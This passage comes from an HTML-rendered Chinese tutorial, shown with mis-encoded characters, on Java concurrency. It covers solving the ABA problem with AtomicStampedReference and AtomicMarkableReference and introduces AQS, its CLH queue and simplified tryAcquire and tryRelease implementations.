        version = newVersion + <span class="hljs-number">1</span>;  <span class="hljs-comment">// ç‰ˆæœ¬å·é€’å¢</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… èƒ½æ£€æµ‹åˆ°ABAé—®é¢˜</li>
<li>âœ… ç‰ˆæœ¬å·é€’å¢ï¼Œä¸ä¼šé‡å¤</li>
<li>âœ… ç²¾ç¡®æ§åˆ¶æ¯æ¬¡ä¿®æ”¹</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>âš ï¸ éœ€è¦é¢å¤–çš„å­˜å‚¨ç©ºé—´ï¼ˆç‰ˆæœ¬å·ï¼‰</li>
<li>âš ï¸ å®ç°ç¨å¾®å¤æ‚ä¸€äº›</li>
</ul>
<h4 data-id="heading-115">AtomicStampedReferenceï¼ˆç‰ˆæœ¬å·è§£å†³æ–¹æ¡ˆï¼‰</h4>
<p><strong>AtomicStampedReference</strong>ï¼šJavaæä¾›çš„å¸¦ç‰ˆæœ¬å·çš„åŸå­å¼•ç”¨ç±»ï¼Œå¯ä»¥è§£å†³ABAé—®é¢˜ã€‚</p>
<p><strong>ä½¿ç”¨æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicStampedReference;

<span class="hljs-comment">// åˆ›å»ºï¼šåˆå§‹å€¼ä¸º"A"ï¼Œç‰ˆæœ¬å·ä¸º0</span>
AtomicStampedReference&lt;String&gt; ref = 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicStampedReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-number">0</span>);

<span class="hljs-comment">// è·å–å€¼å’Œç‰ˆæœ¬å·</span>
<span class="hljs-type">int</span>[] stampHolder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];  <span class="hljs-comment">// ç”¨äºæ¥æ”¶ç‰ˆæœ¬å·çš„æ•°ç»„</span>
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> ref.get(stampHolder);
<span class="hljs-type">int</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> stampHolder[<span class="hljs-number">0</span>];    <span class="hljs-comment">// å½“å‰ç‰ˆæœ¬å·</span>

<span class="hljs-comment">// CASæ“ä½œï¼šåŒæ—¶æ¯”è¾ƒå€¼å’Œç‰ˆæœ¬å·</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(
    <span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>,        <span class="hljs-comment">// æœŸæœ›å€¼å’Œæ–°å€¼</span>
    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>             <span class="hljs-comment">// æœŸæœ›ç‰ˆæœ¬å·å’Œæ–°ç‰ˆæœ¬å·</span>
);

<span class="hljs-comment">// è®¾ç½®å€¼å’Œç‰ˆæœ¬å·</span>
ref.set(<span class="hljs-string">"C"</span>, <span class="hljs-number">2</span>);     <span class="hljs-comment">// è®¾ç½®å€¼ä¸º"C"ï¼Œç‰ˆæœ¬å·ä¸º2</span>
</code></pre>
<p><strong>è§£å†³ABAé—®é¢˜çš„ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicStampedReference&lt;String&gt; ref = 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicStampedReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-number">0</span>);

<span class="hljs-comment">// çº¿ç¨‹1ï¼šå‡†å¤‡ä¿®æ”¹</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">int</span>[] stamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];
    <span class="hljs-type">String</span> <span class="hljs-variable">old</span> <span class="hljs-operator">=</span> ref.get(stamp);      <span class="hljs-comment">// è·å–å€¼å’Œç‰ˆæœ¬å·</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">oldVersion</span> <span class="hljs-operator">=</span> stamp[<span class="hljs-number">0</span>];        <span class="hljs-comment">// version = 0</span>
    
    Thread.sleep(<span class="hljs-number">1000</span>);
    
    <span class="hljs-comment">// CASï¼šåŒæ—¶æ£€æŸ¥å€¼å’Œç‰ˆæœ¬å·</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(
        old, <span class="hljs-string">"C"</span>, 
        oldVersion, oldVersion + <span class="hljs-number">1</span>
    );
    <span class="hljs-comment">// å¦‚æœçº¿ç¨‹2æ”¹è¿‡ï¼Œç‰ˆæœ¬å·å·²ç»ä¸æ˜¯0äº†ï¼ŒCASå¤±è´¥ âœ…</span>
});

<span class="hljs-comment">// çº¿ç¨‹2ï¼šA -&gt; B -&gt; A</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">int</span>[] stamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];
    <span class="hljs-type">String</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> ref.get(stamp);
    
    <span class="hljs-comment">// A -&gt; Bï¼Œç‰ˆæœ¬å· 0 -&gt; 1</span>
    ref.compareAndSet(current, <span class="hljs-string">"B"</span>, stamp[<span class="hljs-number">0</span>], stamp[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>);
    
    <span class="hljs-comment">// B -&gt; Aï¼Œç‰ˆæœ¬å· 1 -&gt; 2</span>
    current = ref.get(stamp);
    ref.compareAndSet(current, <span class="hljs-string">"A"</span>, stamp[<span class="hljs-number">0</span>], stamp[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>);
    <span class="hljs-comment">// æ­¤æ—¶å€¼è¿˜æ˜¯Aï¼Œä½†ç‰ˆæœ¬å·å·²ç»æ˜¯2äº†</span>
});

t1.start();
t2.start();
<span class="hljs-comment">// ç»“æœï¼šçº¿ç¨‹1çš„CASå¤±è´¥ï¼Œå› ä¸ºç‰ˆæœ¬å·ä¸åŒ¹é… âœ…</span>
</code></pre>
<p><strong>æ ¸å¿ƒæ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–å€¼å’Œç‰ˆæœ¬å·</span>
V <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span>[] stampHolder)</span>  <span class="hljs-comment">// ç‰ˆæœ¬å·é€šè¿‡æ•°ç»„è¿”å›</span>

<span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®ï¼ˆåŒæ—¶æ¯”è¾ƒå€¼å’Œç‰ˆæœ¬å·ï¼‰</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSet</span><span class="hljs-params">(V expectedValue, V newValue,
                      <span class="hljs-type">int</span> expectedStamp, <span class="hljs-type">int</span> newStamp)</span>

<span class="hljs-comment">// è®¾ç½®å€¼å’Œç‰ˆæœ¬å·</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">set</span><span class="hljs-params">(V newValue, <span class="hljs-type">int</span> newStamp)</span>
</code></pre>
<h4 data-id="heading-116">AtomicMarkableReferenceï¼ˆæ ‡è®°ä½è§£å†³æ–¹æ¡ˆï¼‰</h4>
<p><strong>AtomicMarkableReference</strong>ï¼šä½¿ç”¨booleanæ ‡è®°ä»£æ›¿ç‰ˆæœ¬å·ï¼Œæ›´èŠ‚çœå†…å­˜ã€‚</p>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>åªéœ€è¦çŸ¥é“å€¼æ˜¯å¦è¢«ä¿®æ”¹è¿‡ï¼ˆä¸éœ€è¦çŸ¥é“ä¿®æ”¹äº†å‡ æ¬¡ï¼‰</li>
<li>å¯¹ç²¾åº¦è¦æ±‚ä¸é«˜</li>
<li>æƒ³èŠ‚çœå†…å­˜ï¼ˆbooleanæ¯”intå°ï¼‰</li>
</ul>
<p><strong>ä½¿ç”¨æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicMarkableReference;

<span class="hljs-comment">// åˆ›å»ºï¼šåˆå§‹å€¼ä¸º"A"ï¼Œæ ‡è®°ä¸ºfalse</span>
AtomicMarkableReference&lt;String&gt; ref = 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicMarkableReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-literal">false</span>);

<span class="hljs-comment">// è·å–å€¼å’Œæ ‡è®°</span>
<span class="hljs-type">boolean</span>[] markHolder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">1</span>];
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> ref.get(markHolder);
<span class="hljs-type">boolean</span> <span class="hljs-variable">mark</span> <span class="hljs-operator">=</span> markHolder[<span class="hljs-number">0</span>];  <span class="hljs-comment">// å½“å‰æ ‡è®°</span>

<span class="hljs-comment">// CASæ“ä½œï¼šåŒæ—¶æ¯”è¾ƒå€¼å’Œæ ‡è®°</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(
    <span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>,        <span class="hljs-comment">// æœŸæœ›å€¼å’Œæ–°å€¼</span>
    <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>      <span class="hljs-comment">// æœŸæœ›æ ‡è®°å’Œæ–°æ ‡è®°</span>
);
</code></pre>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicMarkableReference&lt;String&gt; ref = 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicMarkableReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-literal">false</span>);

<span class="hljs-comment">// çº¿ç¨‹1</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">boolean</span>[] mark = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">1</span>];
    <span class="hljs-type">String</span> <span class="hljs-variable">old</span> <span class="hljs-operator">=</span> ref.get(mark);
    <span class="hljs-type">boolean</span> <span class="hljs-variable">oldMark</span> <span class="hljs-operator">=</span> mark[<span class="hljs-number">0</span>];  <span class="hljs-comment">// false</span>
    
    Thread.sleep(<span class="hljs-number">1000</span>);
    
    <span class="hljs-comment">// CASï¼šæ£€æŸ¥å€¼å’Œæ ‡è®°</span>
    ref.compareAndSet(old, <span class="hljs-string">"C"</span>, oldMark, <span class="hljs-literal">true</span>);
    <span class="hljs-comment">// å¦‚æœçº¿ç¨‹2æ”¹è¿‡ï¼Œæ ‡è®°å·²ç»ä¸æ˜¯falseäº†ï¼ŒCASå¤±è´¥</span>
});

<span class="hljs-comment">// çº¿ç¨‹2ï¼šä¿®æ”¹å€¼å¹¶æ”¹å˜æ ‡è®°</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">boolean</span>[] mark = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">1</span>];
    <span class="hljs-type">String</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> ref.get(mark);
    
    <span class="hljs-comment">// ä¿®æ”¹å€¼ï¼Œæ ‡è®° false -&gt; true</span>
    ref.compareAndSet(current, <span class="hljs-string">"B"</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);
    <span class="hljs-comment">// å†æ”¹å›æ¥ï¼Œæ ‡è®° true -&gt; false</span>
    ref.compareAndSet(<span class="hljs-string">"B"</span>, <span class="hljs-string">"A"</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);
});
</code></pre>
<p><strong>å¯¹æ¯”æ€»ç»“ï¼š</strong></p>



































<table><thead><tr><th>ç‰¹æ€§</th><th>AtomicStampedReference</th><th>AtomicMarkableReference</th></tr></thead><tbody><tr><td><strong>æ ‡è®°ç±»å‹</strong></td><td>intï¼ˆç‰ˆæœ¬å·ï¼‰</td><td>booleanï¼ˆæ ‡è®°ï¼‰</td></tr><tr><td><strong>ç²¾åº¦</strong></td><td>âœ… é«˜ï¼ˆçŸ¥é“ä¿®æ”¹æ¬¡æ•°ï¼‰</td><td>âš ï¸ ä½ï¼ˆåªçŸ¥é“æ˜¯å¦ä¿®æ”¹è¿‡ï¼‰</td></tr><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>âš ï¸ è¾ƒå¤§ï¼ˆint 4å­—èŠ‚ï¼‰</td><td>âœ… è¾ƒå°ï¼ˆboolean 1å­—èŠ‚ï¼‰</td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>éœ€è¦ç²¾ç¡®ç‰ˆæœ¬æ§åˆ¶</td><td>åªéœ€è¦æ ‡è®°æ˜¯å¦ä¿®æ”¹</td></tr><tr><td><strong>æ¨èä½¿ç”¨</strong></td><td>å¤§å¤šæ•°åœºæ™¯</td><td>å†…å­˜æ•æ„Ÿã€ç²¾åº¦è¦æ±‚ä¸é«˜çš„åœºæ™¯</td></tr></tbody></table>
<p><strong>é€‰æ‹©å»ºè®®ï¼š</strong></p>
<ul>
<li>å¤§å¤šæ•°æƒ…å†µä¸‹ä½¿ç”¨ <strong>AtomicStampedReference</strong>ï¼ˆæ›´ç²¾ç¡®ï¼‰</li>
<li>å¦‚æœåªéœ€è¦æ ‡è®°æ˜¯å¦ä¿®æ”¹è¿‡ï¼Œä¸”å†…å­˜ç´§å¼ ï¼Œä½¿ç”¨ <strong>AtomicMarkableReference</strong></li>
</ul>
<hr/>
<h2 data-id="heading-117">ç¬¬å…­ç«  AQSï¼ˆAbstractQueuedSynchronizerï¼‰</h2>
<h3 data-id="heading-118">6.1 AQSæ¦‚è¿°</h3>
<h4 data-id="heading-119">AQSçš„è®¾è®¡æ€æƒ³</h4>
<p>**AQSï¼ˆAbstractQueuedSynchronizerï¼‰**æ˜¯JUCåŒ…ä¸­å®ç°åŒæ­¥å™¨çš„åŸºç¡€æ¡†æ¶ï¼Œå¾ˆå¤šåŒæ­¥å·¥å…·ç±»éƒ½æ˜¯åŸºäºAQSå®ç°çš„ã€‚</p>
<p><strong>æ ¸å¿ƒæ€æƒ³ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨ä¸€ä¸ª<strong>volatile int state</strong>è¡¨ç¤ºåŒæ­¥çŠ¶æ€</li>
<li>ä½¿ç”¨<strong>FIFOé˜Ÿåˆ—</strong>ç®¡ç†ç­‰å¾…çº¿ç¨‹</li>
<li>é€šè¿‡<strong>CAS</strong>æ“ä½œæ›´æ–°çŠ¶æ€</li>
<li>é€šè¿‡<strong>æ¨¡æ¿æ–¹æ³•æ¨¡å¼</strong>ï¼Œå­ç±»å®ç°å…·ä½“çš„åŒæ­¥é€»è¾‘</li>
</ul>
<p><strong>è®¾è®¡æ¨¡å¼ï¼š</strong></p>
<ul>
<li>æ¨¡æ¿æ–¹æ³•æ¨¡å¼ï¼šå®šä¹‰ç®—æ³•éª¨æ¶ï¼Œå­ç±»å®ç°å…·ä½“æ­¥éª¤</li>
<li>çŠ¶æ€æ¨¡å¼ï¼šæ ¹æ®stateçš„ä¸åŒå€¼ï¼Œæ‰§è¡Œä¸åŒçš„é€»è¾‘</li>
</ul>
<h4 data-id="heading-120">AQSçš„æ ¸å¿ƒæ•°æ®ç»“æ„</h4>
<p><strong>ä¸»è¦ç»„æˆï¼š</strong></p>
<ol>
<li>
<p><strong>stateï¼ˆåŒæ­¥çŠ¶æ€ï¼‰</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> state; <span class="hljs-comment">// volatileä¿è¯å¯è§æ€§</span>
</code></pre>
</li>
<li>
<p><strong>ç­‰å¾…é˜Ÿåˆ—ï¼ˆCLHé˜Ÿåˆ—ï¼‰</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é˜Ÿåˆ—å¤´èŠ‚ç‚¹ï¼ˆè™šæ‹ŸèŠ‚ç‚¹ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Node head;
<span class="hljs-comment">// é˜Ÿåˆ—å°¾èŠ‚ç‚¹</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Node tail;
</code></pre>
</li>
<li>
<p><strong>NodeèŠ‚ç‚¹</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">SHARED</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(); <span class="hljs-comment">// å…±äº«æ¨¡å¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">EXCLUSIVE</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;    <span class="hljs-comment">// ç‹¬å æ¨¡å¼</span>
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CANCELLED</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// å–æ¶ˆçŠ¶æ€</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SIGNAL</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;    <span class="hljs-comment">// éœ€è¦å”¤é†’</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CONDITION</span> <span class="hljs-operator">=</span> -<span class="hljs-number">2</span>; <span class="hljs-comment">// åœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">PROPAGATE</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3</span>; <span class="hljs-comment">// ä¼ æ’­çŠ¶æ€</span>
    
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> waitStatus;  <span class="hljs-comment">// ç­‰å¾…çŠ¶æ€</span>
    <span class="hljs-keyword">volatile</span> Node prev;       <span class="hljs-comment">// å‰é©±èŠ‚ç‚¹</span>
    <span class="hljs-keyword">volatile</span> Node next;       <span class="hljs-comment">// åç»§èŠ‚ç‚¹</span>
    <span class="hljs-keyword">volatile</span> Thread thread;   <span class="hljs-comment">// çº¿ç¨‹å¼•ç”¨</span>
    Node nextWaiter;          <span class="hljs-comment">// ä¸‹ä¸€ä¸ªç­‰å¾…èŠ‚ç‚¹</span>
}
</code></pre>
</li>
</ol>
<h4 data-id="heading-121">CLHé˜Ÿåˆ—</h4>
<p><strong>CLHé˜Ÿåˆ—çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>**CLHï¼ˆCraig, Landin, and Hagerstenï¼‰**æ˜¯ä¸€ç§è‡ªæ—‹é”é˜Ÿåˆ—</li>
<li>AQSå¯¹CLHé˜Ÿåˆ—è¿›è¡Œäº†æ”¹è¿›ï¼Œä½¿ç”¨åŒå‘é“¾è¡¨</li>
<li>ä½¿ç”¨è™šæ‹Ÿå¤´èŠ‚ç‚¹ï¼ˆheadï¼‰ç®€åŒ–æ“ä½œ</li>
<li>èŠ‚ç‚¹é€šè¿‡CASæ“ä½œå…¥é˜Ÿå’Œå‡ºé˜Ÿ</li>
</ul>
<p><strong>é˜Ÿåˆ—ç»“æ„ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">head</span> (è™šæ‹ŸèŠ‚ç‚¹)
  â†“
Node1 â†â†’ Node2 â†â†’ Node3 (<span class="hljs-built_in">tail</span>)
  â†‘        â†‘        â†‘
Thread1  Thread2  Thread3
</code></pre>
<h3 data-id="heading-122">6.2 AQSçš„æ ¸å¿ƒæ–¹æ³•</h3>
<h4 data-id="heading-123">tryAcquire/tryReleaseï¼ˆç‹¬å æ¨¡å¼ï¼‰</h4>
<p><strong>ç‹¬å æ¨¡å¼ï¼ˆExclusiveï¼‰ï¼š</strong> åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è·å–é”ã€‚</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>ç‹¬å æ¨¡å¼å°±åƒåªæœ‰ä¸€ä¸ªåº§ä½çš„ä¼šè®®å®¤</li>
<li>å…¶ä»–çº¿ç¨‹å¿…é¡»ç­‰å¾…å½“å‰çº¿ç¨‹é‡Šæ”¾é”</li>
<li>å…¸å‹åº”ç”¨ï¼šReentrantLock</li>
</ul>
<h5 data-id="heading-124">tryAcquireï¼ˆå°è¯•è·å–é”ï¼‰</h5>
<p><strong>æ–¹æ³•å®šä¹‰ï¼š</strong> å­ç±»éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ï¼Œå®šä¹‰å¦‚ä½•è·å–é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQSä¸­çš„æŠ½è±¡æ–¹æ³•ï¼Œå­ç±»å¿…é¡»å®ç°</span>
<span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}
</code></pre>
<p><strong>ReentrantLockçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> getState();  <span class="hljs-comment">// è·å–å½“å‰çŠ¶æ€</span>
    
    <span class="hljs-keyword">if</span> (state == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// é”ç©ºé—²ï¼Œå°è¯•CASè·å–</span>
        <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)) {
            setExclusiveOwnerThread(Thread.currentThread());
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// è·å–æˆåŠŸ</span>
        }
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isCurrentThreadOwner()) {
        <span class="hljs-comment">// å¯é‡å…¥ï¼šå½“å‰çº¿ç¨‹å·²æŒæœ‰é”ï¼Œstate+1</span>
        setState(state + <span class="hljs-number">1</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è·å–å¤±è´¥</span>
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ol>
<li>æ£€æŸ¥é”æ˜¯å¦ç©ºé—²ï¼ˆstate == 0ï¼‰</li>
<li>å¦‚æœç©ºé—²ï¼ŒCASå°è¯•è·å–é”</li>
<li>å¦‚æœå½“å‰çº¿ç¨‹å·²æŒæœ‰é”ï¼Œæ”¯æŒå¯é‡å…¥</li>
<li>è¿”å›trueè¡¨ç¤ºè·å–æˆåŠŸï¼Œfalseè¡¨ç¤ºå¤±è´¥</li>
</ol>
<h5 data-id="heading-125">tryReleaseï¼ˆå°è¯•é‡Šæ”¾é”ï¼‰</h5>
<p><strong>æ–¹æ³•å®šä¹‰ï¼š</strong> å­ç±»éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ï¼Œå®šä¹‰å¦‚ä½•é‡Šæ”¾é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQSä¸­çš„æŠ½è±¡æ–¹æ³•ï¼Œå­ç±»å¿…é¡»å®ç°</span>
<span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}
</code></pre>
<p><strong>ReentrantLockçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">newState</span> <span class="hljs-operator">=</span> getState() - releases;  <span class="hljs-comment">// çŠ¶æ€å‡1</span>
    
    <span class="hljs-keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();  <span class="hljs-comment">// åªæœ‰æŒæœ‰é”çš„çº¿ç¨‹æ‰èƒ½é‡Šæ”¾</span>
    
    <span class="hljs-keyword">if</span> (newState == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// å®Œå…¨é‡Šæ”¾é”</span>
        setExclusiveOwnerThread(<span class="hljs-literal">null</span>);
        setState(<span class="hljs-number">0</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// è¿˜æœ‰é‡å…¥æ¬¡æ•°ï¼Œåªæ›´æ–°state</span>
        setState(newState);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ol>
<li>æ£€æŸ¥æ˜¯å¦æ˜¯æŒæœ‰é”çš„çº¿ç¨‹ï¼ˆé˜²æ­¢éæ³•é‡Šæ”¾ï¼‰</li>
<li>stateå‡1</li>
<li>å¦‚æœstateå˜ä¸º0ï¼Œå®Œå…¨é‡Šæ”¾é”</li>
<li>è¿”å›trueè¡¨ç¤ºé”å·²å®Œå…¨é‡Šæ”¾ï¼Œfalseè¡¨ç¤ºè¿˜æœ‰é‡å…¥æ¬¡æ•°</li>
</ol>
<h4 data-id="heading-126">tryAcquireShared/tryReleaseSharedï¼ˆå…±äº«æ¨¡å¼ï¼‰</h4>
<p><strong>å…±äº«æ¨¡å¼ï¼ˆSharedï¼‰ï¼š</strong> å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶è·å–é”ã€‚</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>å…±äº«æ¨¡å¼å°±åƒå›¾ä¹¦é¦†ï¼Œå¤šä¸ªäººå¯ä»¥åŒæ—¶è¿›å…¥</li>
<li>stateè¡¨ç¤ºå¯ç”¨èµ„æºæ•°é‡</li>
<li>å…¸å‹åº”ç”¨ï¼šSemaphoreï¼ˆä¿¡å·é‡ï¼‰ã€ReadWriteLockçš„è¯»é”</li>
</ul>
<h5 data-id="heading-127">tryAcquireSharedï¼ˆå°è¯•è·å–å…±äº«é”ï¼‰</h5>
<p><strong>æ–¹æ³•å®šä¹‰ï¼š</strong> å­ç±»éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ï¼Œå®šä¹‰å¦‚ä½•è·å–å…±äº«é”ã€‚</p>
<p><strong>è¿”å›å€¼å«ä¹‰ï¼š</strong></p>
<ul>
<li><strong>è´Ÿæ•°</strong>ï¼šè·å–å¤±è´¥</li>
<li><strong>0</strong>ï¼šè·å–æˆåŠŸï¼Œä½†æ²¡æœ‰å‰©ä½™èµ„æºäº†</li>
<li><strong>æ­£æ•°</strong>ï¼šè·å–æˆåŠŸï¼Œè¿˜æœ‰å‰©ä½™èµ„æº</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQSä¸­çš„æŠ½è±¡æ–¹æ³•</span>
<span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tryAcquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}
</code></pre>
<p><strong>Semaphoreçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
